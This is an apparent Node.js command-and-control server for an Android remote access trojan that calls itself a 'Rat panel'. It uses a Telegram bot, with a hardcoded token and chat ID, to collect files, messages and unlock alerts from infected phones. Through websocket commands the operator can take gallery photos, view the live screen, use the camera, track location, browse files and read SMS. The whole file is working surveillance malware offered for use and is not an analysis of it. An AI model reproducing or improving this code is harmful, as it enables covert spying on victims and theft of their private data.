const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8350295309:AAFmEjuayK0FMMwXUcPMR77aDiEYzot-sqo'
const id = '7608303601'
const address = 'https://www.google.com' // এখানে আপনার সার্ভারের লিঙ্ক দিলে ভালো হয়

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

// ফোন আনলক অ্যালার্ট এবং অন্যান্য ইভেন্টের জন্য নতুন এন্ডপয়েন্ট
app.post("/uploadEvent", (req, res) => {
    const event = req.body['event'];
    const model = req.headers.model || "Unknown Device";
    if (event === 'screen_unlocked') {
        appBot.sendMessage(id, `🔓 𝘼𝙡𝙚𝙧𝙩: 𝘿𝙚𝙫𝙞𝙘𝙚 <b>${model}</b> 𝙟𝙪𝙨𝙩 𝙪𝙣𝙡𝙤𝙘𝙠𝙚𝙙!`, {parse_mode: "HTML"});
    }
    res.send('Event Received')
})

// ফাইল আপলোড (গ্যালারি বা অন্যান্য ফাইল)
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙁𝙞𝙡𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/octet-stream',
        })
    res.send('')
})

// আগের সব মূল ফাংশন (uploadText, uploadLocation) এখানে অপরিবর্তিত থাকবে...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    ws.uuid = uuid
    appClients.set(uuid, { model: model, battery: req.headers.battery })
    
    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙: <b>${model}</b>`, {parse_mode: "HTML"})
    
    ws.on('close', () => appClients.delete(ws.uuid))
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (id != chatId) return;

    if (message.text == '/start') {
        appBot.sendMessage(id, '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡', {
            reply_markup: {
                keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                resize_keyboard: true
            }
        });
    }

    if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
        appClients.forEach((value, key) => {
            text += `• ᴍᴏᴅᴇʟ : <b>${value.model}</b> (UUID: ${key})\n`
        })
        appBot.sendMessage(id, text || "No devices online", {parse_mode: "HTML"})
    }

    if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        const deviceListKeyboard = []
        appClients.forEach((value, key) => {
            deviceListKeyboard.push([{ text: value.model, callback_data: 'device:' + key }])
        })
        appBot.sendMessage(id, '𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚:', { reply_markup: { inline_keyboard: deviceListKeyboard } })
    }
    
    // রিপ্লাই হ্যান্ডলারগুলো (SMS, Notification ইত্যাদি) আগের মতোই থাকবে...
})

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const [command, uuid] = callbackQuery.data.split(':');

    if (command == 'device') {
        appBot.editMessageText(`°• 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙛𝙤𝙧: <b>${appClients.get(uuid).model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{text: '🖼️ 𝘼𝙡𝙡 𝙂𝙖𝙡𝙡𝙚𝙧𝙮 𝙋𝙝𝙤𝙩𝙤𝙨', callback_data: `all_photos:${uuid}`}],
                    [{text: '📺 𝙇𝙞𝙫𝙚 𝙎𝙘𝙧𝙚𝙚𝙣', callback_data: `live_screen:${uuid}`}],
                    [{text: '🔒 𝙇𝙤𝙘𝙠', callback_data: `lock:${uuid}`}, {text: '🔓 𝙐𝙣𝙡𝙤𝙘𝙠', callback_data: `unlock:${uuid}`}],
                    [{text: '📸 𝘾𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`}, {text: '📍 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`}],
                    [{text: '📂 𝙁𝙞𝙡𝙚𝙨', callback_data: `file:${uuid}`}, {text: '💬 𝙎𝙈𝙎', callback_data: `messages:${uuid}`}]
                ]
            },
            parse_mode: "HTML"
        })
    }

    // নতুন ফিচারের সকেট কমান্ড পাঠানো
    if (['all_photos', 'live_screen', 'lock', 'unlock', 'location', 'camera_main', 'messages'].includes(command)) {
        appSocket.clients.forEach(ws => {
            if (ws.uuid == uuid) ws.send(command);
        });
        appBot.sendMessage(id, `°• 𝙍𝙚𝙦𝙪𝙚𝙨𝙩 𝙨𝙚𝙣𝙩: ${command.toUpperCase()}`);
    }
});

appServer.listen(process.env.PORT || 8999);